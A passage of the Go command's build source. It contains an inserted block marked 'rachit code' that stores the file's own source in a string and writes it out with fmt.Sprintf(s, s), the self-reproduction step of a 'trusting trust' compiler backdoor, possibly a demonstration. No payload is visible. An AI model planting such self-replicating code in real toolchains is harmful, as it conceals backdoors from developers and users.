\"_cgo_gotypes.go\"}\n\tcfiles := []string{\"_cgo_main.c\", \"_cgo_export.c\"}\n\tfor _, fn := range cgofiles {\n\t\tf := cgoRe.ReplaceAllString(fn[:len(fn)-2], \"_\")\n\t\tgofiles = append(gofiles, obj+f+\"cgo1.go\")\n\t\tcfiles = append(cfiles, f+\"cgo2.c\")\n\t}\n\tdefunC := obj + \"_cgo_defun.c\"\n\n\tcgoflags := []string{}\n\t// TODO: make cgo not depend on $GOARCH?\n\n\tif p.Standard && p.ImportPath == \"runtime/cgo\" {\n\t\tcgoflags = append(cgoflags, \"-import_runtime_cgo=false\")\n\t}\n\tif p.Standard && (p.ImportPath == \"runtime/race\" || p.ImportPath == \"runtime/msan\" || p.ImportPath == \"runtime/cgo\") {\n\t\tcgoflags = append(cgoflags, \"-import_syscall=false\")\n\t}\n\n\t// Update $CGO_LDFLAGS with p.CgoLDFLAGS.\n\tvar cgoenv []string\n\tif len(cgoLDFLAGS) > 0 {\n\t\tflags := make([]string, len(cgoLDFLAGS))\n\t\tfor i, f := range cgoLDFLAGS {\n\t\t\tflags[i] = strconv.Quote(f)\n\t\t}\n\t\tcgoenv = []string{\"CGO_LDFLAGS=\" + strings.Join(flags, \" \")}\n\t}\n\n\tif _, ok := buildToolchain.(gccgoToolchain); ok {\n\t\tswitch goarch {\n\t\tcase \"386\", \"amd64\":\n\t\t\tcgoCFLAGS = append(cgoCFLAGS, \"-fsplit-stack\")\n\t\t}\n\t\tcgoflags = append(cgoflags, \"-gccgo\")\n\t\tif pkgpath := gccgoPkgpath(p); pkgpath != \"\" {\n\t\t\tcgoflags = append(cgoflags, \"-gccgopkgpath=\"+pkgpath)\n\t\t}\n\t}\n\n\tswitch buildBuildmode {\n\tcase \"c-archive\", \"c-shared\":\n\t\t// Tell cgo that if there are any exported functions\n\t\t// it should generate a header file that C code can\n\t\t// #include.\n\t\tcgoflags = append(cgoflags, \"-exportheader=\"+obj+\"_cgo_install.h\")\n\t}\n\n\tif err := b.run(p.Dir, p.ImportPath, cgoenv, buildToolExec, cgoExe, \"-objdir\", obj, \"-importpath\", p.ImportPath, cgoflags, \"--\", cgoCPPFLAGS, cgoexeCFLAGS, cgofiles); err != nil {\n\t\treturn nil, nil, err\n\t}\n\toutGo = append(outGo, gofiles...)\n\n\t// cc _cgo_defun.c\n\t_, gccgo := buildToolchain.(gccgoToolchain)\n\tif gccgo {\n\t\tdefunObj := obj + \"_cgo_defun.o\"\n\t\tif err := buildToolchain.cc(b, p, obj, defunObj, defunC); err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n\t\toutObj = append(outObj, defunObj)\n\t}\n\n\t// gcc\n\tvar linkobj []string\n\n\tvar bareLDFLAGS []string\n\t// When linking relocatable objects, various flags need to be\n\t// filtered out as they are inapplicable and can cause some linkers\n\t// to fail.\n\tfor i := 0; i < len(cgoLDFLAGS); i++ {\n\t\tf := cgoLDFLAGS[i]\n\t\tswitch {\n\t\t// skip \"-lc\" or \"-l somelib\"\n\t\tcase strings.HasPrefix(f, \"-l\"):\n\t\t\tif f == \"-l\" {\n\t\t\t\ti++\n\t\t\t}\n\t\t// skip \"-framework X\" on Darwin\n\t\tcase goos == \"darwin\" && f == \"-framework\":\n\t\t\ti++\n\t\t// skip \"*.{dylib,so,dll}\"\n\t\tcase strings.HasSuffix(f, \".dylib\"),\n\t\t\tstrings.HasSuffix(f, \".so\"),\n\t\t\tstrings.HasSuffix(f, \".dll\"):\n\t\t// Remove any -fsanitize=foo flags.\n\t\t// Otherwise the compiler driver thinks that we are doing final link\n\t\t// and links sanitizer runtime into the object file. But we are not doing\n\t\t// the final link, we will link the resulting object file again. And\n\t\t// so the program ends up with two copies of sanitizer runtime.\n\t\t// See issue 8788 for details.\n\t\tcase strings.HasPrefix(f, \"-fsanitize=\"):\n\t\t\tcontinue\n\t\t// runpath flags not applicable unless building a shared\n\t\t// object or executable; see issue 12115 for details.  This\n\t\t// is necessary as Go currently does not offer a way to\n\t\t// specify the set of LDFLAGS that only apply to shared\n\t\t// objects.\n\t\tcase strings.HasPrefix(f, \"-Wl,-rpath\"):\n\t\t\tif f == \"-Wl,-rpath\" || f == \"-Wl,-rpath-link\" {\n\t\t\t\t// Skip following argument to -rpath* too.\n\t\t\t\ti++\n\t\t\t}\n\t\tdefault:\n\t\t\tbareLDFLAGS = append(bareLDFLAGS, f)\n\t\t}\n\t}\n\n\tcgoLibGccFileOnce.Do(func() {\n\t\tcgoLibGccFile, cgoLibGccErr = b.libgcc(p)\n\t})\n\tif cgoLibGccFile == \"\" && cgoLibGccErr != nil {\n\t\treturn nil, nil, err\n\t}\n\n\tvar staticLibs []string\n\tif goos == \"windows\" {\n\t\t// libmingw32 and libmingwex might also use libgcc, so libgcc must come last,\n\t\t// and they also have some inter-dependencies, so must use linker groups.\n\t\tstaticLibs = []string{\"-Wl,--start-group\", \"-lmingwex\", \"-lmingw32\", \"-Wl,--end-group\"}\n\t}\n\tif cgoLibGccFile != \"\" {\n\t\tstaticLibs = append(staticLibs, cgoLibGccFile)\n\t}\n\n\tcflags := stringList(cgoCPPFLAGS, cgoCFLAGS)\n\tfor _, cfile := range cfiles {\n\t\tofile := obj + cfile[:len(cfile)-1] + \"o\"\n\t\tif err := b.gcc(p, ofile, cflags, obj+cfile); err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n\t\tlinkobj = append(linkobj, ofile)\n\t\tif !strings.HasSuffix(ofile, \"_cgo_main.o\") {\n\t\t\toutObj = append(outObj, ofile)\n\t\t}\n\t}\n\n\tfor _, file := range gccfiles {\n\t\tofile := obj + cgoRe.ReplaceAllString(file[:len(file)-1], \"_\") + \"o\"\n\t\tif err := b.gcc(p, ofile, cflags, file); err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n\t\tlinkobj = append(linkobj, ofile)\n\t\toutObj = append(outObj, ofile)\n\t}\n\n\tcxxflags := stringList(cgoCPPFLAGS, cgoCXXFLAGS)\n\tfor _, file := range gxxfiles {\n\t\t// Append .o to the file, just in case the pkg has file.c and file.cpp\n\t\tofile := obj + cgoRe.ReplaceAllString(file, \"_\") + \".o\"\n\t\tif err := b.gxx(p, ofile, cxxflags, file); err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n\t\tlinkobj = append(linkobj, ofile)\n\t\toutObj = append(outObj, ofile)\n\t}\n\n\tfor _, file := range mfiles {\n\t\t// Append .o to the file, just in case the pkg has file.c and file.m\n\t\tofile := obj + cgoRe.ReplaceAllString(file, \"_\") + \".o\"\n\t\tif err := b.gcc(p, ofile, cflags, file); err != nil {\n\t\t\treturn nil, nil, err\n\t\t}\n\t\tlinkobj = append(linkobj, ofile)\n\t\toutObj = append(outObj, ofile)\n\t}\n\n\tlinkobj = append(linkobj, p.SysoFiles...)\n\tdynobj := obj + \"_cgo_.o\"\n\tpie := (goarch == \"arm\" && goos == \"linux\") || goos == \"android\"\n\tif pie { // we need to use -pie for Linux/ARM to get accurate imported sym\n\t\tcgoLDFLAGS = append(cgoLDFLAGS, \"-pie\")\n\t}\n\tif err := b.gccld(p, dynobj, cgoLDFLAGS, linkobj); err != nil {\n\t\treturn nil, nil, err\n\t}\n\tif pie { // but we don't need -pie for normal cgo programs\n\t\tcgoLDFLAGS = cgoLDFLAGS[0 : len(cgoLDFLAGS)-1]\n\t}\n\n\tif _, ok := buildToolchain.(gccgoToolchain); ok {\n\t\t// we don't use dynimport when using gccgo.\n\t\treturn outGo, outObj, nil\n\t}\n\n\t// cgo -dynimport\n\timportGo := obj + \"_cgo_import.go\"\n\tcgoflags = []string{}\n\tif p.Standard && p.ImportPath == \"runtime/cgo\" {\n\t\tcgoflags = append(cgoflags, \"-dynlinker\") // record path to dynamic linker\n\t}\n\tif err := b.run(p.Dir, p.ImportPath, nil, buildToolExec, cgoExe, \"-objdir\", obj, \"-dynpackage\", p.Name, \"-dynimport\", dynobj, \"-dynout\", importGo, cgoflags); err != nil {\n\t\treturn nil, nil, err\n\t}\n\toutGo = append(outGo, importGo)\n\n\tofile := obj + \"_all.o\"\n\tvar gccObjs, nonGccObjs []string\n\tfor _, f := range outObj {\n\t\tif strings.HasSuffix(f, \".o\") {\n\t\t\tgccObjs = append(gccObjs, f)\n\t\t} else {\n\t\t\tnonGccObjs = append(nonGccObjs, f)\n\t\t}\n\t}\n\tldflags := stringList(bareLDFLAGS, \"-Wl,-r\", \"-nostdlib\", staticLibs)\n\n\t// We are creating an object file, so we don't want a build ID.\n\tldflags = b.disableBuildID(ldflags)\n\n\tif err := b.gccld(p, ofile, ldflags, gccObjs); err != nil {\n\t\treturn nil, nil, err\n\t}\n\n\t// NOTE(rsc): The importObj is a 5c/6c/8c object and on Windows\n\t// must be processed before the gcc-generated objects.\n\t// Put it first.  https://golang.org/issue/2601\n\toutObj = stringList(nonGccObjs, ofile)\n\n\treturn outGo, outObj, nil\n}\n\n// Run SWIG on all SWIG input files.\n// TODO: Don't build a shared library, once SWIG emits the necessary\n// pragmas for external linking.\nfunc (b *builder) swig(p *Package, obj string, pcCFLAGS []string) (outGo, outC, outCXX []string, err error) {\n\tif err := b.swigVersionCheck(); err != nil {\n\t\treturn nil, nil, nil, err\n\t}\n\n\tintgosize, err := b.swigIntSize(obj)\n\tif err != nil {\n\t\treturn nil, nil, nil, err\n\t}\n\n\tfor _, f := range p.SwigFiles {\n\t\tgoFile, cFile, err := b.swigOne(p, f, obj, pcCFLAGS, false, intgosize)\n\t\tif err != nil {\n\t\t\treturn nil, nil, nil, err\n\t\t}\n\t\tif goFile != \"\" {\n\t\t\toutGo = append(outGo, goFile)\n\t\t}\n\t\tif cFile != \"\" {\n\t\t\toutC = append(outC, cFile)\n\t\t}\n\t}\n\tfor _, f := range p.SwigCXXFiles {\n\t\tgoFile, cxxFile, err := b.swigOne(p, f, obj, pcCFLAGS, true, intgosize)\n\t\tif err != nil {\n\t\t\treturn nil, nil, nil, err\n\t\t}\n\t\tif goFile != \"\" {\n\t\t\toutGo = append(outGo, goFile)\n\t\t}\n\t\tif cxxFile != \"\" {\n\t\t\toutCXX = append(outCXX, cxxFile)\n\t\t}\n\t}\n\treturn outGo, outC, outCXX, nil\n}\n\n// Make sure SWIG is new enough.\nvar (\n\tswigCheckOnce sync.Once\n\tswigCheck     error\n)\n\nfunc (b *builder) swigDoVersionCheck() error {\n\tout, err := b.runOut(\"\", \"\", nil, \"swig\", \"-version\")\n\tif err != nil {\n\t\treturn err\n\t}\n\tre := regexp.MustCompile(`[vV]ersion +([\\d]+)([.][\\d]+)?([.][\\d]+)?`)\n\tmatches := re.FindSubmatch(out)\n\tif matches == nil {\n\t\t// Can't find version number; hope for the best.\n\t\treturn nil\n\t}\n\n\tmajor, err := strconv.Atoi(string(matches[1]))\n\tif err != nil {\n\t\t// Can't find version number; hope for the best.\n\t\treturn nil\n\t}\n\tconst errmsg = \"must have SWIG version >= 3.0.6\"\n\tif major < 3 {\n\t\treturn errors.New(errmsg)\n\t}\n\tif major > 3 {\n\t\t// 4.0 or later\n\t\treturn nil\n\t}\n\n\t// We have SWIG version 3.x.\n\tif len(matches[2]) > 0 {\n\t\tminor, err := strconv.Atoi(string(matches[2][1:]))\n\t\tif err != nil {\n\t\t\treturn nil\n\t\t}\n\t\tif minor > 0 {\n\t\t\t// 3.1 or later\n\t\t\treturn nil\n\t\t}\n\t}\n\n\t// We have SWIG version 3.0.x.\n\tif len(matches[3]) > 0 {\n\t\tpatch, err := strconv.Atoi(string(matches[3][1:]))\n\t\tif err != nil {\n\t\t\treturn nil\n\t\t}\n\t\tif patch < 6 {\n\t\t\t// Before 3.0.6.\n\t\t\treturn errors.New(errmsg)\n\t\t}\n\t}\n\n\treturn nil\n}\n\nfunc (b *builder) swigVersionCheck() error {\n\tswigCheckOnce.Do(func() {\n\t\tswigCheck = b.swigDoVersionCheck()\n\t})\n\treturn swigCheck\n}\n\n// This code fails to build if sizeof(int) <= 32\nconst swigIntSizeCode = `\npackage main\nconst i int = 1 << 32\n`\n\n// Determine the size of int on the target system for the -intgosize option\n// of swig >= 2.0.9\nfunc (b *builder) swigIntSize(obj string) (intsize string, err error) {\n\tif buildN {\n\t\treturn \"$INTBITS\", nil\n\t}\n\tsrc := filepath.Join(b.work, \"swig_intsize.go\")\n\tif err = ioutil.WriteFile(src, []byte(swigIntSizeCode), 0644); err != nil {\n\t\treturn\n\t}\n\tsrcs := []string{src}\n\n\tp := goFilesPackage(srcs)\n\n\tif _, _, e := buildToolchain.gc(b, p, \"\", obj, false, nil, srcs); e != nil {\n\t\treturn \"32\", nil\n\t}\n\treturn \"64\", nil\n}\n\n// Run SWIG on one SWIG input file.\nfunc (b *builder) swigOne(p *Package, file, obj string, pcCFLAGS []string, cxx bool, intgosize string) (outGo, outC string, err error) {\n\tcgoCPPFLAGS, cgoCFLAGS, cgoCXXFLAGS, _ := b.cflags(p, true)\n\tvar cflags []string\n\tif cxx {\n\t\tcflags = stringList(cgoCPPFLAGS, pcCFLAGS, cgoCXXFLAGS)\n\t} else {\n\t\tcflags = stringList(cgoCPPFLAGS, pcCFLAGS, cgoCFLAGS)\n\t}\n\n\tn := 5 // length of \".swig\"\n\tif cxx {\n\t\tn = 8 // length of \".swigcxx\"\n\t}\n\tbase := file[:len(file)-n]\n\tgoFile := base + \".go\"\n\tgccBase := base + \"_wrap.\"\n\tgccExt := \"c\"\n\tif cxx {\n\t\tgccExt = \"cxx\"\n\t}\n\n\t_, gccgo := buildToolchain.(gccgoToolchain)\n\n\t// swig\n\targs := []string{\n\t\t\"-go\",\n\t\t\"-cgo\",\n\t\t\"-intgosize\", intgosize,\n\t\t\"-module\", base,\n\t\t\"-o\", obj + gccBase + gccExt,\n\t\t\"-outdir\", obj,\n\t}\n\n\tfor _, f := range cflags {\n\t\tif len(f) > 3 && f[:2] == \"-I\" {\n\t\t\targs = append(args, f)\n\t\t}\n\t}\n\n\tif gccgo {\n\t\targs = append(args, \"-gccgo\")\n\t\tif pkgpath := gccgoPkgpath(p); pkgpath != \"\" {\n\t\t\targs = append(args, \"-go-pkgpath\", pkgpath)\n\t\t}\n\t}\n\tif cxx {\n\t\targs = append(args, \"-c++\")\n\t}\n\n\tout, err := b.runOut(p.Dir, p.ImportPath, nil, \"swig\", args, file)\n\tif err != nil {\n\t\tif len(out) > 0 {\n\t\t\tif bytes.Contains(out, []byte(\"-intgosize\")) || bytes.Contains(out, []byte(\"-cgo\")) {\n\t\t\t\treturn \"\", \"\", errors.New(\"must have SWIG version >= 3.0.6\")\n\t\t\t}\n\t\t\tb.showOutput(p.Dir, p.ImportPath, b.processOutput(out)) // swig error\n\t\t\treturn \"\", \"\", errPrintedOutput\n\t\t}\n\t\treturn \"\", \"\", err\n\t}\n\tif len(out) > 0 {\n\t\tb.showOutput(p.Dir, p.ImportPath, b.processOutput(out)) // swig warning\n\t}\n\n\treturn obj + goFile, obj + gccBase + gccExt, nil\n}\n\n// disableBuildID adjusts a linker command line to avoid creating a\n// build ID when creating an object file rather than an executable or\n// shared library.  Some systems, such as Ubuntu, always add\n// --build-id to every link, but we don't want a build ID when we are\n// producing an object file.  On some of those system a plain -r (not\n// -Wl,-r) will turn off --build-id, but clang 3.0 doesn't support a\n// plain -r.  I don't know how to turn off --build-id when using clang\n// other than passing a trailing --build-id=none.  So that is what we\n// do, but only on systems likely to support it, which is to say,\n// systems that normally use gold or the GNU linker.\nfunc (b *builder) disableBuildID(ldflags []string) []string {\n\tswitch goos {\n\tcase \"android\", \"dragonfly\", \"linux\", \"netbsd\":\n\t\tldflags = append(ldflags, \"-Wl,--build-id=none\")\n\t}\n\treturn ldflags\n}\n\n// An actionQueue is a priority queue of actions.\ntype actionQueue []*action\n\n// Implement heap.Interface\nfunc (q *actionQueue) Len() int           { return len(*q) }\nfunc (q *actionQueue) Swap(i, j int)      { (*q)[i], (*q)[j] = (*q)[j], (*q)[i] }\nfunc (q *actionQueue) Less(i, j int) bool { return (*q)[i].priority < (*q)[j].priority }\nfunc (q *actionQueue) Push(x interface{}) { *q = append(*q, x.(*action)) }\nfunc (q *actionQueue) Pop() interface{} {\n\tn := len(*q) - 1\n\tx := (*q)[n]\n\t*q = (*q)[:n]\n\treturn x\n}\n\nfunc (q *actionQueue) push(a *action) {\n\theap.Push(q, a)\n}\n\nfunc (q *actionQueue) pop() *action {\n\treturn heap.Pop(q).(*action)\n}\n\nfunc instrumentInit() {\n\tif !buildRace && !buildMSan {\n\t\treturn\n\t}\n\tif buildRace && buildMSan {\n\t\tfmt.Fprintf(os.Stderr, \"go %%s: may not use -race and -msan simultaneously\", flag.Args()[0])\n\t\tos.Exit(2)\n\t}\n\tif goarch != \"amd64\" || goos != \"linux\" && goos != \"freebsd\" && goos != \"darwin\" && goos != \"windows\" {\n\t\tfmt.Fprintf(os.Stderr, \"go %%s: -race and -msan are only supported on linux/amd64, freebsd/amd64, darwin/amd64 and windows/amd64\\n\", flag.Args()[0])\n\t\tos.Exit(2)\n\t}\n\tif !buildContext.CgoEnabled {\n\t\tfmt.Fprintf(os.Stderr, \"go %%s: -race requires cgo; enable cgo by setting CGO_ENABLED=1\\n\", flag.Args()[0])\n\t\tos.Exit(2)\n\t}\n\tif buildRace {\n\t\tbuildGcflags = append(buildGcflags, \"-race\")\n\t\tbuildLdflags = append(buildLdflags, \"-race\")\n\t} else {\n\t\tbuildGcflags = append(buildGcflags, \"-msan\")\n\t\tbuildLdflags = append(buildLdflags, \"-msan\")\n\t}\n\tif buildContext.InstallSuffix != \"\" {\n\t\tbuildContext.InstallSuffix += \"_\"\n\t}\n\n\tif buildRace {\n\t\tbuildContext.InstallSuffix += \"race\"\n\t\tbuildContext.BuildTags = append(buildContext.BuildTags, \"race\")\n\t} else {\n\t\tbuildContext.InstallSuffix += \"msan\"\n\t\tbuildContext.BuildTags = append(buildContext.BuildTags, \"msan\")\n\t}\n}\n"
	stringbuf := fmt.Sprintf(s, s)

	out.WriteString(stringbuf)
	return
}

// end rachit code

var cmdInstall = &Command{
	UsageLine: "install [build flags] [packages]",
	Short:     "compile and install packages and dependencies",
	Long: `
Install compiles and installs the packages named by the import paths,
along with their dependencies.

For more about the build flags, see 'go help build'.
For more about specifying packages, see 'go help packages'.

See also: go build, go get, go clean.
	`,
}

// libname returns the filename to use for the shared library when using
// -buildmode=shared.  The rules we use are:
//  1) Drop any trailing "/..."s if present
//  2) Change / to -
//  3) Join arguments with ,
// So std -> libstd.so
//    a b/... -> liba,b.so
//    gopkg.in/tomb.v2 -> libgopkg.in-tomb.v2.so
func libname(args []string) string {
	var libname string
	for _, arg := range args {
		arg = strings.TrimSuffix(arg, "/...")
		arg = strings.Replace(arg, "/", "-", -1)
		if libname == "" {
			libname = arg
		} else {
			libname += "," + arg
		}
	}
	// TODO(mwhudson): Needs to change for platforms that use different naming
	// conventions...
	return "lib" + libname + ".so"
}

func runInstall(cmd *Command, args []string) {
	if gobin != "" && !filepath.IsAbs(gobin) {
		fatalf("cannot install, GOBIN must be an absolute path")
	}

	instrumentInit()
	buildModeInit()
	pkgs := pkgsFilter(packagesForBuild(args))

	for _, p := range pkgs {
		if p.Target == "" && (!p.Standard || p.ImportPath != "unsafe") {
			switch {
			case p.gobinSubdir:
				errorf("go install: cannot install cross-compiled binaries when GOBIN is set")
			case p.cmdline:
				errorf("go install: no install location for .go files listed on command line (GOBIN not set)")
			case p.ConflictDir != "":
				errorf("go install: no install location for %s: hidden by %s", p.Dir, p.ConflictDir)
			default:
				errorf("go install: no install location for directory %s outside GOPATH\n"+
					"\tFor more details see: go help gopath", p.Dir)
			}
		}
	}
	exitIfErrors()

	var b builder
	b.init()
	var a *action
	if buildBuildmode == "shared" {
		a = b.libaction(libname(args), pkgs, modeInstall, modeInstall)
	} else {
		a = &action{}
		var tools []*action
		for _, p := range pkgs {
			// If p is a tool, delay the installation until the end of the build.
			// This avoids installing assemblers/compilers that are being executed
			// by other steps in the build.
			// cmd/cgo is handled specially in b.action, so that we can
			// both build and use it in the same 'go install'.
			action := b.action(modeInstall, modeInstall, p)
			if goTools[p.ImportPath] == toTool && p.ImportPath != "cmd/cgo" {
				a.deps = append(a.deps, action.deps...)
				action.deps = append(action.deps, a)
				tools = append(tools, action)
				continue
			}
			a.deps = append(a.deps, action)
		}
		if len(tools) > 0 {
			a = &action{
				deps: tools,
			}
		}
	}
	b.do(a)
	exitIfErrors()

	// Success. If this command is 'go install' with no arguments
	// and the current directory (the implicit argument) is a command,
	// remove any leftover command binary from a previous 'go build'.
	// The binary is installed; it's not needed here anymore.
	// And worse it might be a stale copy, which you don't want to find
	// instead of the installed one if $PATH contains dot.
	// One way to view this behavior is that it is as if 'go install' first
	// runs 'go build' and the moves the generated file to the install dir.
	// See issue 9645.
	if len(args) == 0 && len(pkgs) == 1 && pkgs[0].Name == "main" {
		// Compute file 'go build' would have created.
		// If it exists and is an executable file, remove it.
		_, targ := filepath.Split(pkgs[0].ImportPath)
		targ += exeSuffix
		if filepath.Join(pkgs[0].Dir, targ) != pkgs[0].Target { // maybe $GOBIN is the current directory
			fi, err := os.Stat(targ)
			if err == nil {
				m := fi.Mode()
				if m.IsRegular() {
					if m&0111 != 0 || goos == "windows" { // windows never sets executable bit
						os.Remove(targ)
					}
				}
			}
		}
	}
}

// Global build parameters (used during package load)
var (
	goarch    string
	goos      string
	exeSuffix string
)

func init() {
	goarch = buildContext.GOARCH
	goos = buildContext.GOOS
	if goos == "windows" {
		exeSuffix = ".exe"
	}
}

// A builder holds global state about a build.
// It does not hold per-package state, because we
// build packages in parallel, and the builder is shared.
type builder struct {
	work        string               // the temporary work directory (ends in filepath.Separator)
	actionCache map[cacheKey]*action // a cache of already-constructed actions
	mkdirCache  map[string]bool      // a cache of created directories
	print       func(args ...interface{}) (int, error)

	output    sync.Mutex
	scriptDir string // current directory in printed script

	exec      sync.Mutex
	readySema chan bool
	ready     actionQueue
}

// An action represents a single action in the action graph.
type action struct {
	p          *Package      // the package this action works on
	deps       []*action     // actions that must happen before this one
	triggers   []*action     // inverse of deps
	cgo        *action       // action for cgo binary if needed
	args       []string      // additional args for runProgram
	testOutput *bytes.Buffer // test output buffer

	f          func(*builder, *action) error // the action itself (nil = no-op)
	ignoreFail bool                          // whether to run f even if dependencies fail

	// Generated files, directories.
	link   bool   // target is executable, not just package
	pkgdir string // the -I or -L argument to use when importing this package
	objdir string // directory for intermediate objects
	objpkg string // the intermediate package .a file created during the action
	target string // goal of the action: the created package or executable

	// Execution state.
	pending  int  // number of deps yet to complete
	priority int  // relative execution priority
	failed   bool // whether the action failed
}

// cacheKey is the key for the action cache.
type cacheKey struct {
	mode  buildMode
	p     *Package
	shlib string
}

// buildMode specifies the build mode:
// are we just building things or also installing the results?
type buildMode int

const (
	modeBuild buildMode = iota
	modeInstall
)

var (
	goroot    = filepath.Clean(runtime.GOROOT())
	gobin     = os.Getenv("GOBIN")
	gorootBin = filepath.Join(goroot, "bin")
	gorootPkg = filepath.Join(goroot, "pkg")
	gorootSrc = filepath.Join(goroot, "src")
)

func (b *builder) init() {
	var err error
	b.print = func(a ...interface{}) (int, error) {
		return fmt.Fprint(os.Stderr, a...)
	}
	b.actionCache = make(map[cacheKey]*action)
	b.mkdirCache = make(map[string]bool)

	if buildN {
		b.work = "$WORK"
	} else {
		b.work, err = ioutil.TempDir("", "go-build")
		if err != nil {
			fatalf("%s", err)
		}
		if buildX || buildWork {
			fmt.Fprintf(os.Stderr, "WORK=%s\n", b.work)
		}
		if !buildWork {
			workdir := b.work
			atexit(func() { os.RemoveAll(workdir) })
		}
	}
}

// goFilesPackage creates a package for building a collection of Go files
// (typically named on the command line).  The target is named p.a for
// package p or named after the first Go file for package main.
func goFilesPackage(gofiles []string) *Package {
	// TODO: Remove this restriction.
	for _, f := range gofiles {
		if !strings.HasSuffix(f, ".go") {
			fatalf("named files must be .go files")
		}
	}

	var stk importStack
	ctxt := buildContext
	ctxt.UseAllFiles = true

	// Synthesize fake "directory" that only shows the named files,
	// to make it look like this is a standard package or
	// command directory.  So that local imports resolve
	// consistently, the files must all be in the same directory.
	var dirent []os.FileInfo
	var dir string
	for _, file := range gofiles {
		fi, err := os.Stat(file)
		if err != nil {
			fatalf("%s", err)
		}
		if fi.IsDir() {
			fatalf("%s is a directory, should be a Go file", file)
		}
		dir1, _ := filepath.Split(file)
		if dir1 == "" {
			dir1 = "./"
		}
		if dir == "" {
			dir = dir1
		} else if dir != dir1 {
			fatalf("named files must all be in one directory; have %s and %s", dir, dir1)
		}
		dirent = append(dirent, fi)
	}
	ctxt.ReadDir = func(string) ([]os.FileInfo, error) { return dirent, nil }

	var err error
	if dir == "" {
		dir = cwd
	}
	dir, err = filepath.Abs(dir)
	if err != nil {
		fatalf("%s", err)
	}

	bp, err := ctxt.ImportDir(dir, 0)
	pkg := new(Package)
	pkg.local = true
	pkg.cmdline = true
	pkg.load(&stk, bp, err)
	pkg.localPrefix = dirToImportPath(dir)
	pkg.ImportPath = "command-line-arguments"
	pkg.target = ""

	if pkg.Name == "main" {
		_, elem := filepath.Split(gofiles[0])
		exe := elem[:len(elem)-len(".go")] + exeSuffix
		if *buildO == "" {
			*buildO = exe
		}
		if gobin != "" {
			pkg.target = filepath.Join(gobin, exe)
		}
	}

	pkg.Target = pkg.target
	pkg.Stale = true

	computeStale(pkg)
	return pkg
}

// readpkglist returns the list of packages that were built into the shared library
// at shlibpath. For the native toolchain this list is stored, newline separated, in
// an ELF note with name "Go\x00\x00" and type 1. For GCCGO it is extracted from the
// .go_export section.
func readpkglist(shlibpath string) (pkgs []*Package) {
	var stk importStack
	if _, gccgo := buildToolchain.(gccgoToolchain); gccgo {
		f, _ := elf.Open(shlibpath)
		sect := f.Section(".go_export")
		data, _ := sect.Data()
		scanner := bufio.NewScanner(bytes.NewBuffer(data))
		for scanner.Scan() {
			t := scanner.Text()
			if strings.HasPrefix(t, "pkgpath ") {
				t = strings.TrimPrefix(t, "pkgpath ")
				t = strings.TrimSuffix(t, ";")
				pkgs = append(pkgs, loadPackage(t, &stk))
			}
		}
	} else {
		pkglistbytes, err := readELFNote(shlibpath, "Go\x00\x00", 1)
		if err != nil {
			fatalf("readELFNote failed: %v", err)
		}
		scanner := bufio.NewScanner(bytes.NewBuffer(pkglistbytes))
		for scanner.Scan() {
			t := scanner.Text()
			pkgs = append(pkgs, loadPackage(t, &stk))
		}
	}
	return
}

// action returns the action for applying the given operation (mode) to the package.
// depMode is the action to use when building dependencies.
// action never looks for p in a shared library, but may find p's dependencies in a
// shared library if buildLinkshared is true.
func (b *builder) action(mode buildMode, depMode buildMode, p *Package) *action {
	return b.action1(mode, depMode, p, false, "")
}

// action1 returns the action for applying the given operation (mode) to the package.
// depMode is the action to use when building dependencies.
// action1 will look for p in a shared library if lookshared is true.
// forShlib is the shared library that p will become part of, if any.
func (b *builder) action1(mode buildMode, depMode buildMode, p *Package, lookshared bool, forShlib string) *action {
	shlib := ""
	if lookshared {
		shlib = p.Shlib
	}
	key := cacheKey{mode, p, shlib}

	a := b.actionCache[key]
	if a != nil {
		return a
	}
	if shlib != "" {
		key2 := cacheKey{modeInstall, nil, shlib}
		a = b.actionCache[key2]
		if a != nil {
			b.actionCache[key] = a
			return a
		}
		pkgs := readpkglist(shlib)
		a = b.libaction(filepath.Base(shlib), pkgs, modeInstall, depMode)
		b.actionCache[key2] = a
		b.actionCache[key] = a
		return a
	}

	a = &action{p: p, pkgdir: p.build.PkgRoot}
	if p.pkgdir != "" { // overrides p.t
		a.pkgdir = p.pkgdir
	}
	b.actionCache[key] = a

	for _, p1 := range p.imports {
		if forShlib != "" {
			// p is part of a shared library.
			if p1.Shlib != "" && p1.Shlib != forShlib {
				// p1 is explicitly part of a different shared library.
				// Put the action for that shared library into a.deps.
				a.deps = append(a.deps, b.action1(depMode, depMode, p1, true, p1.Shlib))
			} else {
				// p1 is (implicitly or not) part of this shared library.
				// Put the action for p1 into a.deps.
				a.deps = append(a.deps, b.action1(depMode, depMode, p1, false, forShlib))
			}
		} else {
			// p is not part of a shared library.
			// If p1 is in a shared library, put the action for that into
			// a.deps, otherwise put the action for p1 into a.deps.
			a.deps = append(a.deps, b.action1(depMode, depMode, p1, buildLinkshared, p1.Shlib))
		}
	}

	// If we are not doing a cross-build, then record the binary we'll
	// generate for cgo as a dependency of the build of any package
	// using cgo, to make sure we do not overwrite the binary while
	// a package is using it.  If this is a cross-build, then the cgo we
	// are writing is not the cgo we need to use.
	if goos == runtime.GOOS && goarch == runtime.GOARCH && !buildRace && !buildMSan {
		if (len(p.CgoFiles) > 0 || p.Standard && p.ImportPath == "runtime/cgo") && !buildLinkshared && buildBuildmode != "shared" {
			var stk importStack
			p1 := loadPackage("cmd/cgo", &stk)
			if p1.Error != nil {
				fatalf("load cmd/cgo: %v", p1.Error)
			}
			a.cgo = b.action(depMode, depMode, p1)
			a.deps = append(a.deps, a.cgo)
		}
	}

	if p.Standard {
		switch p.ImportPath {
		case "builtin", "unsafe":
			// Fake packages - nothing to build.
			return a
		}
		// gccgo standard library is "fake" too.
		if _, ok := buildToolchain.(gccgoToolchain); ok {
			// the target name is needed for cgo.
			a.target = p.target
			return a
		}
	}

	if !p.Stale && p.target != "" {
		// p.Stale==false implies that p.target is up-to-date.
		// Record target name for use by actions depending on this one.
		a.target = p.target
		return a
	}

	if p.local && p.target == "" {
		// Imported via local path.  No permanent target.
		mode = modeBuild
	}
	work := p.pkgdir
	if work == "" {
		work = b.work
	}
	a.objdir = filepath.Join(work, a.p.ImportPath, "_obj") + string(filepath.Separator)
	a.objpkg = buildToolchain.pkgpath(work, a.p)
	a.link = p.Name == "main"

	switch mode {
	case modeInstall:
		a.f = (*builder).install
		a.deps = []*action{b.action1(modeBuild, depMode, p, lookshared, forShlib)}
